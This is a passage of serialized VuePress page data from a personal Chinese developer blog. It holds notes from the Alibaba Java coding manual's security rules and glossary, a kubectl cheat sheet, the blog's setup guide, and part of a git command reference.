【强制】禁止向 html 页面输出未经安全过滤或未正确转义的用户数据。\n\n 6. 【强制】表单、ajax 提交必须执行 csrf 安全过滤。\n    说明： csrf(cross-site request forgery)跨站请求伪造是一类常见编程漏洞。对于存在 csrf 漏洞的应用/网站，攻击者可以事先构造好 url，只要受害者用户一访问，后台便在用户 不知情情况下对数据库中用户参数进行相应修改。\n\n 7. 【强制】在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放限制， 如数量限制、疲劳度控制、验证码校验，避免被滥刷、资损。 说明：如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能骚扰到其 它用户，并造成短信平台资源浪费。\n\n 8. 【推荐】发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过 滤等风控策略。\n\n\n# 附 1：版本历史\n\n版本号     更新日期        备注\n1.0.0   2017.2.9    阿里巴巴集团正式对外发布\n1.0.1   2017.2.13   1）修正 string[]的前后矛盾。2）vm 修正成 velocity。3）修正 countdown 描述错误。\n1.0.2   2017.2.20   1）去除文底水印。2）数据类型中引用太阳系年龄问题。3）修正关于异常和方法签名的部分描述。4）修正 final\n                    描述。5）去除 comparator 部分描述。\n1.1.0   2017.2.27   1）增加前言。2）增加<? extends t>描述和说明。3）增加版本历史。4）增加专有名词解释。\n1.1.1   2017.3.31   修正页码总数和部分示例\n1.2.0   2017.5.20   1）根据云栖社区的“聚能聊”活动反馈，对手册的页码、排版、描述进行修正。2）增加\n                    final的适用场景描述。3）增加关于锁的粒度的说明。4）增加“指定集合大小”的详细说明以及正反例。5）增加卫语句的示例代码。6）明确数据库表示删除概念的字段名为\n                    is_deleted\n\n\n# 附 2：本手册专有名词\n\n 1.  pojo（plain ordinary java object）：在本手册中，pojo 专指只有 setter / getter / tostring 的简单类，包括 do/dto/bo/vo 等。\n\n 2.  do（data object）：本手册指数据库表一一对应的 pojo 类。\n\n 3.  gav（groupid、artifactctid、version）：maven 坐标，是用来唯一标识 jar 包。\n\n 4.  oop（object oriented programming）: 本手册泛指类、对象的编程处理方式。\n\n 5.  orm（object relation mapping）: 对象关系映射，对象领域模型与底层数据之间的转换， 本文泛指 ibatis, mybatis 等框架。\n\n 6.  npe（java.lang.nullpointerexception）: 空指针异常。\n\n 7.  soa（service-oriented architecture）: 面向服务架构，它可以根据需求通过网络对松散 耦合的粗粒度应用组件进行分布式部署、组合和使用，有利于提升组件可重用性，可维护性。\n\n 8.  一方库：本工程内部子项目模块依赖的库（jar 包）。\n\n 9.  二方库：公司内部发布到中央仓库，可供公司内部其它应用依赖的库（jar 包）。\n\n 10. 三方库：公司之外的开源库（jar 包）。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"k8s基本命令与pod管理",frontmatter:{title:"k8s基本命令与pod管理",date:"2022-01-17T00:00:00.000Z",tags:["分布式","k8s"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/specification/k8s%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8Epod%E7%AE%A1%E7%90%86.html",relativePath:"views/specification/k8s基本命令与pod管理.md",key:"v-285ffff6",path:"/views/specification/k8s%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8Epod%E7%AE%A1%E7%90%86.html",headers:[{level:2,title:"查看指定命名空间下的所有节点",slug:"查看指定命名空间下的所有节点",normalizedTitle:"查看指定命名空间下的所有节点",charIndex:29},{level:2,title:"进入某一节点",slug:"进入某一节点",normalizedTitle:"进入某一节点",charIndex:47},{level:2,title:"删除某一节点",slug:"删除某一节点",normalizedTitle:"删除某一节点",charIndex:57},{level:2,title:"查看pod暴露的端口号",slug:"查看pod暴露的端口号",normalizedTitle:"查看pod暴露的端口号",charIndex:67},{level:2,title:"移动文件至pod内部",slug:"移动文件至pod内部",normalizedTitle:"移动文件至pod内部",charIndex:82},{level:2,title:"修改ConfigMap",slug:"修改configmap",normalizedTitle:"修改configmap",charIndex:96},{level:2,title:"其他参考",slug:"其他参考",normalizedTitle:"其他参考",charIndex:111}],excerpt:"<Boxx/>\n<p>工作中常用到的 k8s 命令备份，方便查看。</p>\n",headersStr:"查看指定命名空间下的所有节点 进入某一节点 删除某一节点 查看pod暴露的端口号 移动文件至pod内部 修改ConfigMap 其他参考",content:"工作中常用到的 k8s 命令备份，方便查看。\n\n\n\n * 查看指定命名空间下的所有节点\n * 进入某一节点\n * 删除某一节点\n * 查看pod暴露的端口号\n * 移动文件至pod内部\n * 修改ConfigMap\n * 其他参考\n\n\n\n\n# 查看指定命名空间下的所有节点\n\nkubectl get pod -n znote\n\n\n1\n\n\n\n# 进入某一节点\n\nkubectl exec -it test-pod-statefulset-1 /bin/bash -n znote\n\n\n1\n\n\n\n# 删除某一节点\n\nkubectl delete test-pod-statefulset-1 -n znote\n\n\n1\n\n\n\n# 查看pod暴露的端口号\n\nkubectl get svc -n znote\n\n\n1\n\n\n\n# 移动文件至pod内部\n\n移到文件到容器中pod的pvc目录下后重启pod，pvc目录中的文件不会丢失\n\nkubectl -n znote cp ./aaa test-pod-statefulset-1:/bbb/sdf\n\n\n1\n\n\n\n# 修改ConfigMap\n\n同理修改：pod、svc、statefulset、cm（cm代表ConfigMap）\n\n# 查看ConfigMap\nkubectl get cm -n obp\n# 编辑\nkubectl edit cm test-pod-config -n znote\n# 删除\nkubectl delete cm test-pod-config -n znote\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 其他参考\n\nk8s中部署发布应用",normalizedContent:"工作中常用到的 k8s 命令备份，方便查看。\n\n\n\n * 查看指定命名空间下的所有节点\n * 进入某一节点\n * 删除某一节点\n * 查看pod暴露的端口号\n * 移动文件至pod内部\n * 修改configmap\n * 其他参考\n\n\n\n\n# 查看指定命名空间下的所有节点\n\nkubectl get pod -n znote\n\n\n1\n\n\n\n# 进入某一节点\n\nkubectl exec -it test-pod-statefulset-1 /bin/bash -n znote\n\n\n1\n\n\n\n# 删除某一节点\n\nkubectl delete test-pod-statefulset-1 -n znote\n\n\n1\n\n\n\n# 查看pod暴露的端口号\n\nkubectl get svc -n znote\n\n\n1\n\n\n\n# 移动文件至pod内部\n\n移到文件到容器中pod的pvc目录下后重启pod，pvc目录中的文件不会丢失\n\nkubectl -n znote cp ./aaa test-pod-statefulset-1:/bbb/sdf\n\n\n1\n\n\n\n# 修改configmap\n\n同理修改：pod、svc、statefulset、cm（cm代表configmap）\n\n# 查看configmap\nkubectl get cm -n obp\n# 编辑\nkubectl edit cm test-pod-config -n znote\n# 删除\nkubectl delete cm test-pod-config -n znote\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 其他参考\n\nk8s中部署发布应用",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"ZNOTE GUIDE",frontmatter:{title:"ZNOTE GUIDE",date:"2020-03-26T00:00:00.000Z",tags:["vuepress"],categories:["规范 Standard"],isShowComments:!0,sidebar:!1,publish:!0,sticky:1},regularPath:"/views/specification/guide.html",relativePath:"views/specification/guide.md",key:"v-3951b898",path:"/views/specification/guide.html",headers:[{level:2,title:"项目介绍",slug:"项目介绍",normalizedTitle:"项目介绍",charIndex:25},{level:2,title:"项目运行",slug:"项目运行",normalizedTitle:"项目运行",charIndex:33},{level:2,title:"项目架构",slug:"项目架构",normalizedTitle:"项目架构",charIndex:41},{level:2,title:"如何使用",slug:"如何使用",normalizedTitle:"如何使用",charIndex:49},{level:3,title:"关键字说明",slug:"关键字说明",normalizedTitle:"关键字说明",charIndex:59},{level:3,title:"参考示例",slug:"参考示例",normalizedTitle:"参考示例",charIndex:70},{level:2,title:"写在最后",slug:"写在最后",normalizedTitle:"写在最后",charIndex:78},{level:2,title:"关于友链",slug:"关于友链",normalizedTitle:"关于友链",charIndex:86}],excerpt:'<Boxx/>\n<p>开始使用此博客的一些注意事项和说明。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n',headersStr:"项目介绍 项目运行 项目架构 如何使用 关键字说明 参考示例 写在最后 关于友链",content:"开始使用此博客的一些注意事项和说明。\n\n\n\n * 项目介绍\n * 项目运行\n * 项目架构\n * 如何使用\n   * 关键字说明\n   * 参考示例\n * 写在最后\n * 关于友链\n\n\n\n\n# znote\n\n * 积丝成寸，积寸成尺；寸尺水已，遂成丈匹\n\n\n\n\n\n\n\n * 已全局适配 手机模式 和 暗黑模式（自适应） 请自行体验\n\n * 推荐访问：https://north-glory.github.io/\n   国内访问：https://zpj80231.gitee.io/ （自Gitee实名认证后已不再同步更新，现在访问还是之前的旧版本）\n\n * 音乐播放器插件：目前已自动适配网络，在网络可达的情况下会加载音乐播放器插件并播放音乐，网络不可达的时候不会加载\n   \n   > 音乐播放器插件目前在外网环境下可以正常使用（使用的网易云API）\n   > 验证播放器是否可用：能打开这个网站即会自动加载正常使用 --\x3e 点击测试\n   > 因为依赖项目 NeteaseCloudMusicApi 使用 Vercel 免费部署\n   > 而 Vercel 目前对国内网络不开放，所以要么自行搭建 NeteaseCloudMusicApi，要么使用魔法\n\n * 本仓库代码使用 MIT 协议进行开源，但是全部文档内容使用 CC 4.0 BY-SA 协议进行发布\n\n\n\n\n# 项目介绍\n\n * 工作经验：记录生产级别问题排查处理\n * 知识小结：技术栈知识点笔记总结\n * 生活随笔：个人牢骚发布\n * 其它：欢迎入队 ...\n\n\n# 项目运行\n\n * 克隆项目，在项目文件夹下执行命令，加载依赖：npm install\n\n * 在项目文件夹下执行命令运行项目：\n   \n   node14 版本：npm run dev\n   \n   node16 版本及以上：npm run dev:node:16 （在 Mac 上运行：npm run dev:node:16:mac)\n\n * 待启动成功后打开地址即可：http://localhost:8080/\n\n\n# 项目架构\n\n * 采用 vuepress 和 主题 reco 二次构建\n\n## 需要自己写主题样式的话，在.vuepress/ 下新建theme文件夹并按如下目录布局\nDev\n├─── docs\n│   └── .vuepress   // 配置目录\n│   │    ├── public // 静态资源\n│   │    ├── theme  // 主题\n│   │    │   ├── components // 组件\n│   │    │   ├── global-components // 全局组件\n│   │    │   ├── layouts // 布局(包括首页在内)\n│   │    │   ├── styles  // 样式\n│   │    │   ├── util \t // 工具\n│   │    │   ├── index.js // 入口配置\n│   │    │   ├── noopModule.js // 依赖注入\n│   │    │   ├── package.json  // 主题依赖\n│   │    │   ├── README.md     // 主题说明\n│   │    └── config.js\n│   ├── about   // 项目模块\n│   ├── other   // 项目模块\n│   ├── views   // 项目模块\n│   └── README.md   // 首页\n└── package.json //项目依赖\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 如何使用\n\n对准备发布的文章（Markdown 格式），放置在项目 docs/views/ 目录下，并在 Markdown 文件头部添加以下元素，项目发布后会自动识别文章标题、标签、分类、是否开启评论、是否加密、是否置顶、是否发布等一系列状态。\n\n下面是关键字说明及参考示例：\n\n\n# 关键字说明\n\n序号   关键字              注释\n1    title            文章标题\n2    date             日期，如：2020-02-02\n3    tags             标签\n4    categories       分类\n5    keys             文章加密密码\n6    sticky           文章置顶 1, 2, 3, ...\n7    isShowComments   是否开启评论\n8    publish          文章是否发布\n9    <Boxx/>          只需引入这个标签即可，随机展示名人名言\n10   [[toc]]          生成目录及链接\n11   \x3c!-- more --\x3e    在\x3c!-- more --\x3e之前的内容会展示为文章摘要\n\n\n# 参考示例\n\n---\ntitle: 文章标题\ndate: 2020-02-02\ntags:\n - 标签\ncategories:\n - 分类\nkeys:\n - '123456'\nsticky: 1 \nisShowComments: false\npublish: true\n---\n\n<Boxx/>\n\n[[toc]]\n\n- 这里可以写`摘要`等其它\n\n\x3c!-- more --\x3e\n\n## 正式开始你的markdown\n\n- To be or not to be, ...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 写在最后\n\n在 Blog 搭建中遇到问题，推荐先去以下几个网址找答案：\n\n * vuepress官网：https://vuepress.vuejs.org/zh/\n * vuepress自定义开发主题：https://vuepress.vuejs.org/zh/theme/writing-a-theme.html\n * vuepress-theme-reco官网：https://vuepress-theme-reco.recoluan.com/\n\n如果在博客中遇到什么问题，不要一上来就问我，最好先查下相关资料，实在解决不了的可以找我咨询哈（减少无效沟通嘛），毕竟只有自己淌过的坑才能深入理解、印象深刻！\n\n当然，遇到一些有价值的问题，还是欢迎来找我共同探讨的😉~~\n\n关于如何提问，在 Github 中这个项目可以说是相当 nice 了，可以的话一定要过一遍，于人于己都有莫大的好处：提问的智慧\n\n\n# 关于友链\n\n近期也发现有好些人要加 友链 的，在这里我也说一下吧：\n\n你可以复用我的 Blog，但是需要在你的 Blog 创新一些东西，比如添加你具有独立见解的文章，或者在其他方面体现自己独特的创意或价值（改改样式、优化一下功能等等），然后我给你加友链。毕竟千篇一律的友链没有必要是吧！\n\nThanks for you!",normalizedContent:"开始使用此博客的一些注意事项和说明。\n\n\n\n * 项目介绍\n * 项目运行\n * 项目架构\n * 如何使用\n   * 关键字说明\n   * 参考示例\n * 写在最后\n * 关于友链\n\n\n\n\n# znote\n\n * 积丝成寸，积寸成尺；寸尺水已，遂成丈匹\n\n\n\n\n\n\n\n * 已全局适配 手机模式 和 暗黑模式（自适应） 请自行体验\n\n * 推荐访问：https://north-glory.github.io/\n   国内访问：https://zpj80231.gitee.io/ （自gitee实名认证后已不再同步更新，现在访问还是之前的旧版本）\n\n * 音乐播放器插件：目前已自动适配网络，在网络可达的情况下会加载音乐播放器插件并播放音乐，网络不可达的时候不会加载\n   \n   > 音乐播放器插件目前在外网环境下可以正常使用（使用的网易云api）\n   > 验证播放器是否可用：能打开这个网站即会自动加载正常使用 --\x3e 点击测试\n   > 因为依赖项目 neteasecloudmusicapi 使用 vercel 免费部署\n   > 而 vercel 目前对国内网络不开放，所以要么自行搭建 neteasecloudmusicapi，要么使用魔法\n\n * 本仓库代码使用 mit 协议进行开源，但是全部文档内容使用 cc 4.0 by-sa 协议进行发布\n\n\n\n\n# 项目介绍\n\n * 工作经验：记录生产级别问题排查处理\n * 知识小结：技术栈知识点笔记总结\n * 生活随笔：个人牢骚发布\n * 其它：欢迎入队 ...\n\n\n# 项目运行\n\n * 克隆项目，在项目文件夹下执行命令，加载依赖：npm install\n\n * 在项目文件夹下执行命令运行项目：\n   \n   node14 版本：npm run dev\n   \n   node16 版本及以上：npm run dev:node:16 （在 mac 上运行：npm run dev:node:16:mac)\n\n * 待启动成功后打开地址即可：http://localhost:8080/\n\n\n# 项目架构\n\n * 采用 vuepress 和 主题 reco 二次构建\n\n## 需要自己写主题样式的话，在.vuepress/ 下新建theme文件夹并按如下目录布局\ndev\n├─── docs\n│   └── .vuepress   // 配置目录\n│   │    ├── public // 静态资源\n│   │    ├── theme  // 主题\n│   │    │   ├── components // 组件\n│   │    │   ├── global-components // 全局组件\n│   │    │   ├── layouts // 布局(包括首页在内)\n│   │    │   ├── styles  // 样式\n│   │    │   ├── util \t // 工具\n│   │    │   ├── index.js // 入口配置\n│   │    │   ├── noopmodule.js // 依赖注入\n│   │    │   ├── package.json  // 主题依赖\n│   │    │   ├── readme.md     // 主题说明\n│   │    └── config.js\n│   ├── about   // 项目模块\n│   ├── other   // 项目模块\n│   ├── views   // 项目模块\n│   └── readme.md   // 首页\n└── package.json //项目依赖\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 如何使用\n\n对准备发布的文章（markdown 格式），放置在项目 docs/views/ 目录下，并在 markdown 文件头部添加以下元素，项目发布后会自动识别文章标题、标签、分类、是否开启评论、是否加密、是否置顶、是否发布等一系列状态。\n\n下面是关键字说明及参考示例：\n\n\n# 关键字说明\n\n序号   关键字              注释\n1    title            文章标题\n2    date             日期，如：2020-02-02\n3    tags             标签\n4    categories       分类\n5    keys             文章加密密码\n6    sticky           文章置顶 1, 2, 3, ...\n7    isshowcomments   是否开启评论\n8    publish          文章是否发布\n9    <boxx/>          只需引入这个标签即可，随机展示名人名言\n10   [[toc]]          生成目录及链接\n11   \x3c!-- more --\x3e    在\x3c!-- more --\x3e之前的内容会展示为文章摘要\n\n\n# 参考示例\n\n---\ntitle: 文章标题\ndate: 2020-02-02\ntags:\n - 标签\ncategories:\n - 分类\nkeys:\n - '123456'\nsticky: 1 \nisshowcomments: false\npublish: true\n---\n\n<boxx/>\n\n[[toc]]\n\n- 这里可以写`摘要`等其它\n\n\x3c!-- more --\x3e\n\n## 正式开始你的markdown\n\n- to be or not to be, ...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 写在最后\n\n在 blog 搭建中遇到问题，推荐先去以下几个网址找答案：\n\n * vuepress官网：https://vuepress.vuejs.org/zh/\n * vuepress自定义开发主题：https://vuepress.vuejs.org/zh/theme/writing-a-theme.html\n * vuepress-theme-reco官网：https://vuepress-theme-reco.recoluan.com/\n\n如果在博客中遇到什么问题，不要一上来就问我，最好先查下相关资料，实在解决不了的可以找我咨询哈（减少无效沟通嘛），毕竟只有自己淌过的坑才能深入理解、印象深刻！\n\n当然，遇到一些有价值的问题，还是欢迎来找我共同探讨的😉~~\n\n关于如何提问，在 github 中这个项目可以说是相当 nice 了，可以的话一定要过一遍，于人于己都有莫大的好处：提问的智慧\n\n\n# 关于友链\n\n近期也发现有好些人要加 友链 的，在这里我也说一下吧：\n\n你可以复用我的 blog，但是需要在你的 blog 创新一些东西，比如添加你具有独立见解的文章，或者在其他方面体现自己独特的创意或价值（改改样式、优化一下功能等等），然后我给你加友链。毕竟千篇一律的友链没有必要是吧！\n\nthanks for you!",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Git常用命令清单",frontmatter:{title:"Git常用命令清单",date:"2018-03-12T00:00:00.000Z",sidebar:!0,sidebarDepth:5,tags:["开发规范","git"],categories:["规范 Standard"],isShowComments:!0},regularPath:"/views/specification/git.html",relativePath:"views/specification/git.md",key:"v-677a0c34",path:"/views/specification/git.html",headers:[{level:2,title:"架构",slug:"架构",normalizedTitle:"架构",charIndex:2},{level:2,title:"一、新建代码库",slug:"一、新建代码库",normalizedTitle:"一、新建代码库",charIndex:128},{level:2,title:"二、配置",slug:"二、配置",normalizedTitle:"二、配置",charIndex:275},{level:2,title:"三、增加/删除文件",slug:"三、增加-删除文件",normalizedTitle:"三、增加/删除文件",charIndex:546},{level:2,title:"四、代码提交",slug:"四、代码提交",normalizedTitle:"四、代码提交",charIndex:946},{level:2,title:"五、分支",slug:"五、分支",normalizedTitle:"五、分支",charIndex:1347},{level:2,title:"六、标签",slug:"六、标签",normalizedTitle:"六、标签",charIndex:2140},{level:2,title:"七、查看信息",slug:"七、查看信息",normalizedTitle:"七、查看信息",charIndex:2557},{level:2,title:"八、远程同步",slug:"八、远程同步",normalizedTitle:"八、远程同步",charIndex:3666},{level:2,title:"九、撤销",slug:"九、撤销",normalizedTitle:"九、撤销",charIndex:4088},{level:2,title:"切换分支暂存未提交的commit",slug:"切换分支暂存未提交的commit",normalizedTitle:"切换分支暂存未提交的commit",charIndex:4683},{level:2,title:"十、其他",slug:"十、其他",normalizedTitle:"十、其他",charIndex:5095}],excerpt:'<p><img src="/img/other/git_001.png" alt="" /></p>\n',headersStr:"架构 一、新建代码库 二、配置 三、增加/删除文件 四、代码提交 五、分支 六、标签 七、查看信息 八、远程同步 九、撤销 切换分支暂存未提交的commit 十、其他",content:'# 架构\n\n * git有四个个工作区：\n   1. 工作区（workspace）\n   2. 暂存区（index/stage）\n   3. 本地仓库（local repository）\n   4. 远程仓库（remote repository）\n\n\n# 一、新建代码库\n\n# 在当前目录新建一个Git代码库\n$ git init\n\n# 新建一个目录，将其初始化为Git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二、配置\n\nGit的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。\n\n# 显示当前的Git配置\n$ git config --list\n\n# 编辑Git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name "[name]"\n$ git config [--global] user.email "[email address]"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 三、增加/删除文件\n\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 四、代码提交\n\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 五、分支\n\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track [branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 六、标签\n\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagName]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 七、查看信息\n\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -S [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] HEAD --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件\n$ git log [tag] HEAD --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff HEAD\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat "@{0 day ago}"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n\n# 八、远程同步\n\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 九、撤销\n\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前HEAD为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 切换分支暂存未提交的commit\n\nstash 命令能够将还未 commit 的代码存起来，让你的工作目录变得干净。\n\n切换分支时先用git stash, 从另一个分支切换到本分支用git stash apply, 即可恢复代码。\n\n# 保存当前未commit的代码\ngit stash\n\n# 保存当前未commit的代码并添加备注\ngit stash save "备注的内容"\n\n# 列出stash的所有记录\ngit stash list\n\n# 删除stash的所有记录\ngit stash clear\n\n# 应用最近一次的stash\ngit stash apply\n\n# 应用最近一次的stash，随后删除该记录\ngit stash pop\n\n# 删除最近的一次stash\ngit stash drop\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 十、其他\n\n# 生成一个可供发布的压缩包\n$ git archive\n\n\n1\n2\n\n\n参考自阮一峰老师： 常用 Git 命令清单',normalizedContent:'# 架构\n\n * git有四个个工作区：\n   1. 工作区（workspace）\n   2. 暂存区（index/stage）\n   3. 本地仓库（local repository）\n   4. 远程仓库（remote repository）\n\n\n# 一、新建代码库\n\n# 在当前目录新建一个git代码库\n$ git init\n\n# 新建一个目录，将其初始化为git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二、配置\n\ngit的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。\n\n# 显示当前的git配置\n$ git config --list\n\n# 编辑git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name "[name]"\n$ git config [--global] user.email "[email address]"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 三、增加/删除文件\n\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 四、代码提交\n\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 